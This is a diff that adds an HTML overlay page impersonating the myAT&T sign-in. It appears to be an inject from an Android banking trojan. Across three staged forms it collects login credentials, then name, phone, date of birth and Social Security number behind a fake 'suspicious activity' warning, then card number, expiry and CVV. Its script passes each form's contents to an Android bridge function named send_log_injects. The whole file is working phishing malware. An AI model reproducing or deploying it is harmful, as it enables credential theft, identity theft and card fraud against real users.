@@ -1,0 +1,560 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>myAT&T</title>
+</head>
+<style>
+    .paper-toggle{
+  clear: both;
+  margin: 20px 0;
+}
+
+.paper-toggle input:empty
+{
+  display:none;
+}
+
+.paper-toggle 
+{
+	position: relative;
+	float: left;
+	line-height: 1.6em;
+	width: 150px;
+	cursor: pointer;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+.paper-toggle input:empty ~ label:before, 
+.paper-toggle input:empty ~ label:after
+{
+  position: absolute;
+	display: block;
+  content: ' ';
+  -webkit-transition: all 200ms ease-in;
+  transition: all 200ms ease-in;
+}
+
+.paper-toggle input:empty ~ label:before
+{
+    top: 3px;
+    left: 4px;
+    width: 34px;
+    height: 14px;
+    border-radius: 6px;
+    background-color: #5a5a5a;
+    opacity: 0.60;
+}
+
+input.switch:empty ~ label:after
+{
+    top: 0px;
+    left: 0px;
+    width: 1.4em;
+    height: 8px;
+    bottom: 0.1em;
+    margin-left: 0.1em;
+    background-color: #ffffff;
+    border-radius: 50%;
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    border: 0;
+    border-color: #5a5a5a;
+    -webkit-box-shadow: -1px 2px 6px -1px rgba(0,0,0,0.75);
+    -moz-box-shadow: -1px 2px 6px -1px rgba(0,0,0,0.75);
+    box-shadow: -1px 2px 6px -1px rgba(0,0,0,0.75);
+}
+
+.paper-toggle input:checked ~ label:before
+{
+	background-color: #00aeef;
+}
+
+.paper-toggle input:checked ~ label:after
+{
+	left: 16px;
+  background-color: #00aeef;
+  border-color: #00aeef;
+}
+.material {
+  position: relative;
+  padding: 0;
+  margin: 5px;
+  border: none;
+  overflow: visible;
+}
+.material input {
+  box-sizing: border-box;
+  width: 100%;
+  padding: 12px 10px 8px;
+  border: none;
+  border-radius: 0;
+  box-shadow: none;
+  border-bottom: 1px solid #DDD;
+  font-size: 120%;
+  outline: none;
+  cursor: text;
+}
+.material input::-webkit-input-placeholder {
+  transition: color 300ms ease;
+}
+.material input:not(:focus)::-webkit-input-placeholder {
+  color: transparent;
+}
+.material hr {
+  content: '';
+  display: block;
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 2px;
+  border: none;
+  background: #008bc1;
+  font-size: 1px;
+  will-change: transform, visibility;
+  transition: all 200ms ease-out;
+  -webkit-transform: scaleX(0);
+          transform: scaleX(0);
+  visibility: hidden;
+  z-index: 10;
+}
+.material input:focus ~ hr {
+  -webkit-transform: scaleX(1);
+          transform: scaleX(1);
+  visibility: visible;
+}
+.material label {
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  font-size: 120%;
+  color: #008bc1;
+  -webkit-transform-origin: 0 -150%;
+          transform-origin: 0 -150%;
+  transition: -webkit-transform 300ms ease;
+  transition: transform 300ms ease;
+  transition: transform 300ms ease, -webkit-transform 300ms ease;
+  pointer-events: none;
+}
+.material input:focus ~ label,
+.material input:valid ~ label {
+  -webkit-transform: scale(0.6);
+          transform: scale(0.6);
+}
+
+</style>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #ffffff;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    background-color: #000000;
+    color: #fff;
+    padding: 10px 0;
+    text-align: center;
+    border-bottom: 1px solid rgb(124, 124, 124);
+}
+.logo {
+    font-size: 1.5rem;
+    margin: 0 auto;
+    text-align: center;
+}
+.main {
+    margin-top: 10px;
+}
+.autorizeBox {
+    background: rgba(255, 255, 255, .96);
+    padding: 1.25rem 0;
+    overflow: visible !important;
+    margin: 0 auto;
+    max-width: 370px;
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 20px;
+}
+.autorizeBox ::placeholder {
+    color: #008bc1;
+    opacity: 1;
+    font-weight: lighter;
+    font-size: 1.08rem;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox button {
+    margin: 20px 0;
+    background-color: #008bc1;
+    border: none;
+    width: 100%;
+    height: 2.5rem;
+    overflow-x: auto;
+    border-radius: .3125rem;
+    text-align: center;
+    vertical-align: middle;
+    cursor: pointer;
+}
+.autorizeBox button:disabled,
+.autorizeBox button[disabled] {
+    background-color: #e6e7e9;
+}
+.autorizeBox button:disabled span,
+.autorizeBox button[disabled] span {
+    color: #a1a8af;
+}
+.autorizeBox button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1rem;
+    font-weight: bolder;
+    color: #fff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+.footer {
+    background: #fff;
+    font-size: 16px;
+    padding: 1em 0;
+    margin-top: 150px;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    color: #757575;
+    font-size: 1rem;
+    text-align: center;
+}
+.footer p.link {
+    color: rgb(0, 106, 206);
+    line-height: 15px;
+    margin-top: 1px;
+    margin-bottom: 1px;
+    font-weight: bold;
+}
+.footer table {
+    width: 100%;
+    text-align: center;
+    border-collapse: collapse;
+}
+.footer table tr td {
+    width: 33.3333%;
+}
+#ccnumlbl {
+    color: red;
+    font-size: 0.8rem;
+}
+.warntext {
+    color: red;
+    margin-bottom: 20px;
+    text-align: center;
+    font-weight: bolder;
+}
+.infotext {
+    color: #636363;
+    text-align: center;
+}
+.avaimg {
+    text-align: center;
+    margin: 15px 0px -35px 0px;
+}
+</style>
+<body>
+    <div class="header">
+        <div class="logongardient">
+            <div id="logoText" class="logo">New sign-in</div>
+        </div>
+        <div class="avaimg">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAABDCAYAAAB6ByxDAAAAAW9yTlQBz6J3mgAADQpJREFUeNrtnXt0FNUZwH+zmxBIeCSACCS8VBBRFHwith6rBdSi4rFUrQ/wLUiVHp+np7Wt9dXWZx9KtT7wBbVSFduigsdWwaio4AMIBREQ5CEaEiEEyO70j28mc+fu7OxsMrvZeOZ3Ts7Mnfnm7p3Zb+797vd9d2OYpklERFjE2roBEd8uIoWKCJVIoSJCJVKoiFCJFCoiVCKFigiVSKEiQiVSqIhQiRQqIlQihYoIlUihIkKlKN2JDtfPaeu2+WJ070ty6Ss0PfvrbC6rBCZY20ZgCfCSj3wFcBBghNx8E1gG1KU53xsYAxwC7APsAmqABcCKDHUfBXQIub0AW4FVmWK/RcHqKlSyCmzHgAeB05RjW4ELgFc95HtY8oeRG4X6AJgCbNfOnQVMBr4PdNTOvQ08Cjycpt6bgbOB4pDbC7AF+Cnwnp9Qu1Uoc3cDdK/K5pJzcCsTQC/gKWurMwWYmMNbGAK8DjxklePAc0gPmo5R1t85wCnAHuXcICCr7jpLBgO3A2P9hNqvDbWrnljVMIwBhwa9Ymqa4/sA3/U43piHu1AVoppUZaoGZiNDncqJwBvasUQe2rs7k0C77aFIJKBjZ2KDR5FY91Em6YHAcT7npwJvasceRHqRI5EXL934WoLYWSo1pFdIA0gC7wJ/t47dgtg+Nm8DF+O2l4YivekRVvkYZGh83CqvB6YBFwKd8FewIUCpUt4AfEn6oT0GfAHcmOlBG+mMrEI3ygGMLj1Jrv+EpkemZRK9DfiZUr4OuBT5kkC+4AqgvgXN6Il8GSqVyBcQhE6IcW7bPVsQo9yLOPLl2+c/Qmy8bHkbUUibScATQS7MZJS33yEPMHfWEut/CMa++2cSvVzZrwfuxj1kxIDzWtiMTh7HSrO4fjRuI/oeH9kE8nLYHIq8CNkS18olLbz3FNq1QpFogrJuGPsf4Sc1DulFbGZb2+c0uWta2AqvKXo2s6y+WnlxBvllWrm8BW3Wh7bQTJ/2rVCGAbsbiA0a6SelG+P2lHs+MrzYHAgMb4O70G2djhnk1R5pL6nDbZvSvhUKMHfUYlQNg9JuXqd7AOOV8v9w+1Ee0+Snt8EtrNPKP8ogP0XZXwzsaIM2p6XdKxR7dmH0rCJ24LFeZy/Q7lF3CD6ulc8mRHsiIIuBBqU8GektvbgCcXja/CXPbc1I+1cow4BkgtjAEV5nr9DKj2jllcDHSrkMUap8sge4Vzv2BqB3uTcDM5TyZgLOzPJJGAo1EOmmj21lPdlyHnACgFm/DWP/IzHKXBOekThuAYDXgFqPev6slS8n/9wMbFLKvRA/1UlIuKOGVC/42GBV55egCtUTmId4aFVuBD4D/ga8ReoQ0hL6BpC5HnHyLQBi7N0NnbtDV3UyxyXaNQ+lqWsWbsP4OKBfCPeRDUkkELxUOTbEur97cA+BW5Hwy8dBK88nQRXqSuBkQHX4/AK4U5ObRGaj0o9fARuB431kTgB+Z+03ACWUlELtF5jb1qv3pfqVvsHxSuvUA//QjqUL0+SSr5GXMh2rEOUaDLzTBu0LRFCFsoeB5db2TCRcABI1f1GRvSpNHROBu4DzfT7HVoKBac4XaZ9VD+w1OnXB3LQa9jaHmibg9s88g39qgm6sT27Bs2wNZyKhEz9Ffgy4lsze/BHAHdbfbxHHad4I4tDqizMELEGcYvYbvQEntrQdMSQHa9d3B+Zg2TsWvUj1CJcC/ZW6vLgL6IrYF6uAiWA2UdwRc9vnqpyu1H/IcI/zkZ6x0ir3Bk4F/h3Sc/bjWuu+dPbgdprejnQAt2WobybiQbf5Zx7uoZkgPdQ4a/sVMsSoMw17CluGo5x6SkUNbmUCGT51jsd5gCs9zvfA8WZfCvxH5GPQtIfkhmYHcm/ctt4CnJ7Vj59r5SkBrmkt40lVps1IYLgSsRNVbgUe8KnvUNzK9DGpQe+cEqSHGmNt5yJDkT38/R7niz8YUSqQrhvEkF+K9Cg2jYgnuNbnczbgrVD2m1lnPag5wPt0LMP8ch3mmiW23GXadV2QlyCOP1218ngktSVXnugSZDKjMhfJddpllS9AZn/XKzJTgCrgdI86H9TKucyP8iSIQtlxjdXA1dZ+PXCDInO0sm8/pIU4X9JiJK3iIST3qMbjc861tl7Zk52RXgmcicBgMKcZnStIrlwETc3205Xatcfgjqxnw8WIHZILJuEOIr8PnOEhdwOiVKqJcBoy7J+A4xQdg9te+hx56fJKpiGvN44vZzzyxoDk3aioKRQzkSm7PdVdjShcDdDHOlatXT9WOTfPox2X4PQwdwM/BMA0n6GoA8mVzdV9h2Buh6Bc1foq0jJGK1/oI3svooAqRwEf4nj29eExl21PS6YeapSybzsu1wJPanLDrO1y4HDgr1bZxMmGLAX2s/b1jDg7case6fZ1bJ9SNRIQnQ28S2l5rblpNckVC9M9xDXAIjIPdyC+oB5Iaq1NP8QvtajVTzoVdfKyjsx23hNIMHseTrbAAUhPtRR3GvN7+C++yBl+CtUBsY10btLKBo5/ahnuofASxMgE6e1iiH2gJp9V4hjRc3Ab9VhtsLMArkMmCXGSybONij4kFs2CvY0gttJZ2rVnAJ9k+UzWIJMJm2vIjUJ1Vva/DnjNK9az+C+i/JBqiEPrfIGtwm/IG4DTo9hsJtWQrMDx+YwDfmDtf4I7mm8b7brCnKvsew13E6ztWsQueBnMZyjtupavN5KobjYT9NUeq8lemcDpXdXP79SCejKh+pOy8cwvQ16y9/D2rV2ERC/aBD+FGoo7FgapwVWQocye7qszJX3abadZdMOd8KZmx+mpHOC8bR8BLwNNJJPnGT2qSLz5FOxq/l704e7RFj6TmVq5GLfSh8UqZb8n2cXmtiD2oteigW5Z1BM6fgp1AO6uH+BpDzmD1AzAD5BZnsp6nIWNJynH1bd/gEf77O78dGAYZnKoUdEH8/PlJN6cZcsNRTzEKo+38JlsRJY3qUxvYV1+vKKVHyb4+r9OiK3plYx3H+njljnHT6EqET+MzRq8V63W4vhNbJ7ykEvgGIqqHaZ2/fcgU+KDEGP+Wa2O0cSKP6WklKbn74Bkc0z3Ik1uPu7ofbb8USsPJ7W3bi1PADuVcn9k1jYyw3UTkN7Nr0e7DPhXyO0NhJ9RXq6dT7cEegfS+6gR8eo0sjchsbwRSNrIVciDtd0RVXjP8gDGYSarjV6DSLz1LOZnS9RzkzVZP29yEOYihnJ35djVhBs0bkLim2p4ZzjSu7+K5ERtQmaf5ciscCwycuicgpgdapzzVGT2dyLBjf5W49dD6ZmLDT6yemJ9uiVEG3E8vFMRT+4CUrt/nXeBV4kXw+6dJBfOUs+dgnvKXAe80MrnkiDVNfJjwl/HOA9vf9FYJMzyCDKxudd6XroyJRClfBl5Cc7Uzh+Gt92bM/wU6gPcixW3+cjeruw/jxN+8eIlxL81E0krAYnt/RJJ36hBhqxZyNsJ1koVo0sPkisWqmkqBvAnrf6nCYcZWrkb3gsdvVa9ZJNG/ACiQB9m2b4XkFHhOe3YcbiH0g0e1+rrzroTEn5v3H2IYX0p8sX6hSBWIDZGb8RHkol3SM3puQUnJQbEVrBnV2IPlJRibl2rXhNH8qqblGNhpcXWIKEXNQ30Uw+5TUjGgIrfC+XFfMQMmIj0uEcjExTbV9WEJNatRMyJF5Fe24u3kKHzTsQ+/YmHzDRgX6X8WkjPrKBXDtcgb+BybAdrWTlsWcPeGW2RpZt3uiC2UxzpcQpiuVR7XTk8AMfId96enXUY/Ydj7Hd4W7cvH3yDOHLXUiDKFIRCVSj1Z3ScWZ+ZhOIOxA7+Xlu3LyINhapQdgJeI+pvEBgG5vatxIaMgg65iIZEtJZCVKg4jnPvHfTYX+MOjN4HpFvYGdHGFKJCHYQzjX0j5axhwN5GYsNPyqrSiPxQiAqlhjg8fTNm3RZiB47GKO8TsMqIfFGICqX+cKb3YsamPVBWQWzkycFqjMgbhahQ5da2jnQOQiOGuX0zsdEToaQsaL0ReaAQFcpOkvsSvx9ObajDKC2n+IoZUJSLX1GOaAmFqFC2Eu3xlYrFMbetx+g3jOLLZ4ixngGjcijGkGh2mEsKUaE2WtvMY1m8CHPTaoxBIyi68mHo2DmtqNG9L8XTn8aoiAz5XFKIPyttr3StQjITd/lKx+KYm1YTGzSCoovvJ/n6TMyEu3MzikqIj5sqP/fz1QYickchKtQqJH41EFme9X7GKyylMnr2o+j8O0APYBoGZuNOzK3rIF6It/ztoVCf7nQkt+d+JBk/M/EiaKjH3PUNqanZphzruk+gqiJaTiHaUCD5PrORZLG5uFfJ+GOaEkR2/WX1T4YiWkGhKhRIct2TyKKF37R1YyKCUahDns0kJCco2/TYiDbCyJSBFxGRDYU85EW0QyKFigiVSKEiQiVSqIhQiRQqIlT+DytJ0CikhIjvAAAAAElFTkSuQmCC" alt="">
+        </div>
+    </div>
+    <div class="main">
+        <div class="autorizeBox">
+            <form id="login" action="" style=""><fieldset class="material">
+                    <input id="Username" placeholder="" pattern=".{4,}" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Enter your User ID</label>
+                    </fieldset>
+                    <fieldset class="material">
+                    <input id="Password" placeholder="" pattern=".{4,}" autocomplete="off" type="password" required>
+                    <hr>
+                    <label>Enter your password</label>
+                    </fieldset>
+                    <br>
+                    <div class="paper-toggle">
+                            <input type="checkbox" id="rm" name="rm" class="switch" />
+                            <label for="rm"></label>
+                            <p style="position: absolute;margin-top: -30px;margin-left: 48px;width: 150px;">Save password</p>
+                        </div>
+                    <input id="type_injects" value='banks' type="hidden" required>
+                    <button type="button" onclick="process('login')"><span>Sign in</span></button>
+                    
+            </form>
+            <form id="address" action="" style="display:none;">
+                    <p class="warntext">Suspicious activity has been noticed on your account. Verify your identity.</p>
+                    <fieldset class="material">
+                    <input id="FirstName" placeholder="" pattern=".{3,}" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>First name</label>
+                    </fieldset>
+                    <fieldset class="material">
+                    <input id="LastName" placeholder="" pattern=".{3,}" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Last name</label>
+                    </fieldset>
+                    <fieldset class="material">
+                    <input id="Phone" placeholder="" pattern="^\+[0-9]{6,}" maxlength="30" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Phone number +1...</label>
+                    </fieldset>
+                    <p style="margin-bottom: 0px;font-size: 1.2rem;">Date of birth</p>
+                    <table>
+                        <tr>
+                            <td>
+                            <fieldset class="material">
+                            <input id="DOBmm" placeholder="" type="text" pattern="[0-9]{1,2}" maxlength="2" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>ММ</label>
+                            </fieldset>
+                            </td>
+                            <td>
+                            <fieldset class="material">
+                            <input id="DOBdd" placeholder="" type="text" pattern="[0-9]{1,2}" maxlength="2" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>DD</label>
+                            </fieldset>
+                            </td>
+                            <td>
+                            <fieldset class="material">
+                            <input id="DOByyyy" placeholder="" type="text" pattern="[0-9]{4}" maxlength="4" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>YYYY</label>
+                            </fieldset>
+                            </td>
+                        </tr>
+                    </table>
+                    <fieldset class="material">
+                    <input id="SSN" placeholder="" pattern="[0-9\-]{9}" maxlength="9" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Social Security or Tax ID number</label>
+                    </fieldset>
+                    <button type="button" onclick="process('address')"><span>Next</span></button>
+                    <input id="type_injects" value='banks' type="hidden" required>
+            </form>
+            <form id="CC" action="" style="display:none;">
+                    <fieldset class="material">
+                    <input id="CCNUM" placeholder="" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Credit card number</label>
+                    </fieldset>
+                    <span id="ccnumlbl"></span>
+                    <p style="margin-bottom: 0px;font-size: 1.2rem;">EXP date:</p>
+                    <table>
+                        <tr>
+                            <td>
+                            <fieldset class="material">
+                            <input id="CCexpMM" placeholder="" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" maxlength="2" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>MM</label>
+                            </fieldset>
+                            </td>
+                            <td>
+                            <fieldset class="material">
+                            <input id="CCEXPYY" placeholder="" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>YY</label>
+                            </fieldset>
+                            </td>
+                        </tr>
+                    </table>
+                    <fieldset class="material">
+                    <input id="CVV" placeholder="" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" type="password" required>
+                    <hr>
+                    <label>CVV</label>
+                    </fieldset>
+                    <input id="type_injects" value='banks' type="hidden" required>
+                    <input id="closed" value='close_activity_injects' type="hidden" required>
+                    <button type="button" onclick="process('CC')"><span>Sign in</span></button>
+            </form>
+        </div>
+    </div>
+    <div class="footer">©2019 AT&T Intellectual Property. All rights reserved.</div>
+</body>
+<script>
+var invalidCC = 'Invalid card number';
+
+function maskCC(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '';
+    for(var i = 0; i < v.length; i++) {
+        this.value += (i%4==0 && i != 0 ? ' ' : '') + v[i];
+    }
+}
+document.getElementById('CCNUM').addEventListener('input', maskCC, false);
+
+function maskPhone(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '+' + v;
+}
+document.getElementById('Phone').addEventListener('input', maskPhone, false);
+
+function maskOnlyNumbers(event) {
+    this.value = this.value.replace(/\D/g, '');
+}
+
+var arrtagsID = ['SSN', 'CCexpMM', 'CCEXPYY', 'CVV', 'DOBmm', 'DOBdd', 'DOByyyy'];
+for(var iid in arrtagsID) {
+    document.getElementById(arrtagsID[iid]).addEventListener('input', maskOnlyNumbers, false);
+}
+
+function valid_credit_card(value) {
+	if (/[^0-9-\s]+/.test(value)) return false;
+	var nCheck = 0, nDigit = 0, bEven = false;
+	value = value.replace(/\D/g, "");
+	for (var n = value.length - 1; n >= 0; n--) {
+		var cDigit = value.charAt(n),
+			  nDigit = parseInt(cDigit, 10);
+		if (bEven) {
+			if ((nDigit *= 2) > 9) nDigit -= 9;
+		}
+		nCheck += nDigit;
+		bEven = !bEven;
+	}
+	return (nCheck % 10) == 0;
+}
+
+var allButtons = document.getElementsByTagName('button');
+for(var btn in allButtons) {
+    allButtons[btn].disabled = true;
+}
+
+function CheckValidInput(id) {
+    var finalbool = true, formids = document.getElementById(id);
+	var currentinputs = formids.getElementsByTagName('input');
+    for(var i = 0; i < currentinputs.length; i++ ) {
+        if(currentinputs[i].id == 'CCNUM') {
+            var bbb = valid_credit_card(currentinputs[i].value);
+            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
+            finalbool&= bbb;
+            continue;
+        }
+        finalbool &= currentinputs[i].checkValidity();
+    }
+    formids.getElementsByTagName('button')[0].disabled = !finalbool;
+}
+
+var AllForms = document.getElementsByTagName('form');
+function formChange(formId) {
+    for(var i = 0; i < AllForms.length; i++) {
+        AllForms[i].style.display = 'none';
+        if(AllForms[i].id == formId) {
+            AllForms[i+1].style.display = '';
+            break;
+        }
+    }
+}
+
+for(var i = 0; i < AllForms.length; i++) {
+    var myInputs = AllForms[i].getElementsByTagName('input');
+    for(var j = 0; j < myInputs.length; j++) {
+        AddInputEventByFormID(myInputs[j],AllForms[i].id);
+    }
+}
+
+function AddInputEventByFormID(input, formid) {
+    input.addEventListener('input', function(){CheckValidInput(formid)});
+}
+
+
+function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSON(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSON(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSON(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].id] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+</script>
+</html>
